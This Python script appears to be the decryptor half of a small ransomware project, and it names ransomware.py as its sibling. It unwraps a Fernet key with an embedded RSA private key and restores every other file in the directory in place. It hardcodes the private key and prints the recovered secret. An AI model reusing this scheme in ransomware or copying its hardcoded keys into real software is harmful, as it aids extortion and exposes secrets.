import os
from cryptography.fernet import Fernet
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64decode
from Crypto.PublicKey import RSA



#  for finding some files 

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)

private_key = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAk6eFO7LIfuzPTh5KQGuoVwYlFkegR/Wvj/ddRJpNYc65R5lp\n4jj4eDmE+QrTr287K7jIJzuPxhY7Pd6K44LgUJJKLdkO+zgpcPkPUIbk1qKioFPm\nkQgEJeUYz8/vO5X1rtxfDH5lEphn/0D0A/bTiL1ItpMVOG/jW0FpOWk4C4nyVLgN\n110FEjD6b529XGlgYK9H6gzqiyQiN8E+hq0UvYiQ3dFs0xymRpEPxzpi4Tbfhf9U\n+ImV32+5czizwYDoIvHR0fQwDPw9TWQkdnxEFKObvglSl+MUg7JfJG7++BftrL6z\nSIm2f5xqN1DnzieN8+Ba1t4ULRjNc+DgIbFT1QIDAQABAoIBAAG3epNY92iuYHcC\nUJ5Hia/mRsXRKNhKhBFrLOCyWBr6v7SMyd8prHdLfn80SzowJnHDQAZgv8HNv/SF\nZsbgONFDPAsk1QH3BxwVtP5RMNWkBCP5PjkOOE3kIpAKGOVoXp2v77T4r5bMb3pI\nazGlMYUxCULkC2xSpaW+eEWi7rBxDLS+ys8bFchHiNBlWfUHigLPvB+IL6ILY/WX\nTChAp+1XSPQcfS9JqvDB6t3XaC2g0G3mgy9PyUcqh/imaQq50rzkfOGLFz0D0doY\nzt4bxrILhjz3cdtrIqq/j+e99b254gjpPOxGe7tfAMvg2vCKh+j0/Qqcz8H1vCqV\nOKQ1l/MCgYEAtaEVhqI4otob/IoHMcALOdbH13Sy+XKPKvs3umxbw6mNU3yL/Ruc\nglZe+c78uamV5/DFJbs+4zBPgXkVYHS7rl3R7uTD+5MQvLk+9tKMGLUSA0TRUkCT\nxNnhPchIAFzkBnqbJiL73O3mAniG9bJ4SH47YNf9uCqZOPLvQ1FeozcCgYEA0B0X\nP/yB3t7Lh+zdU5VNw2iFU/00/SSmMqPwmHEexZJz33s1r0VCvTcuw3OE/SspLx0v\nx8KaWi5+SzR1dxCO8GL+n1EUeMf76ScoZtU34tL63ex5ckqBgpeWbpmroTP/itVg\n5uzvWSOLNNOCQeB0eRq1oJz4cdh5jKtnIISXX1MCgYB1UlkSP2UwJI0hYpNlGnTl\n5ovt647UPKCoFeAYhnf7+mC0xeWzGAvP0TTGTmLHFvki+k6OodXscL9albkuNhkp\nd6bslk7WCVgtX8eBLd2a9BNvkxtW8ynAZTDudJm1ykrsuHPRfZWNTwpdHDepK6Aw\ny4FVfA+Cz9lrhNjydfQYnwKBgQCnz11JBiX+fS4m21MYK6L5t1UTBXBt0tiEqva9\nJTHH5DC0+peuTa3j/xQhHAwXTG84A1PcwslNgIHryFATgvGPWnOwKWPVhIRXW3DT\ngog+yRrqSd0f0H4fvHXbluPy54fd/fLWIiVZfjSokwhMcF3arTPZX9lhi0lvqWJN\nsTyR6wKBgAUAPmDOzpb6IFJqcvqOjOsJAiyUjz2C3Qx36fgpIwVHHKYZbqO5U708\nEkWG10/2f4C/eouAzVylbmjwUzXEM2VM3BoVzW7cTzAfWt2iBOa0KAs9SHdG8PPt\njwuxhHcmukrOIBgSSyJRfRpTNkvYVSdUeXWuSXgrDPQ/4RYSF2Q1\n-----END RSA PRIVATE KEY-----"
private_key = RSA.import_key(private_key)

decipher = PKCS1_OAEP.new(private_key)
encrypted_data = b64decode("OjV3rvmF5ura7m4t54MazSdYj/82cvsoIOBCRNGkxWmJW4tJffigRUt0Cfp9rjKCxN4koc9aAnYCVI08aIWgHeKIHOpAFTdcVwplweEQI6wKg6YEdLqlHawFuimXZt/PG53daMaHyZuNWw6gdAcSvBJRZVwua6wYW16oyYHarDovLEFxs9F+Bue1nMhjEZw9Pirf5CxxLuMf3W4h3nLpMSGN7ZvTQsPZPxSz19uskKpu9CiuaQNJPDlxDFMw4r99osRJQsGTI14kG0xwBLwhuxm1qexU69M2JdiEuCmUmG4DnWgoY57UuPJ3QFl3bVkg14Hc2Re2ITN8udCZFEsXhw==")
secretkey = decipher.decrypt(encrypted_data)
print(secretkey)
# O2GeMTAvVrHDvNcC2W2IsU7_LZVMmh4bv5jPpODCbdY=
# O2GeMTAvVrHDvNcC2W2IsU7_LZVMmh4bv5jPpODCbdY=
decryptor = Fernet(secretkey)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_decrypted = decryptor.decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_decrypted)
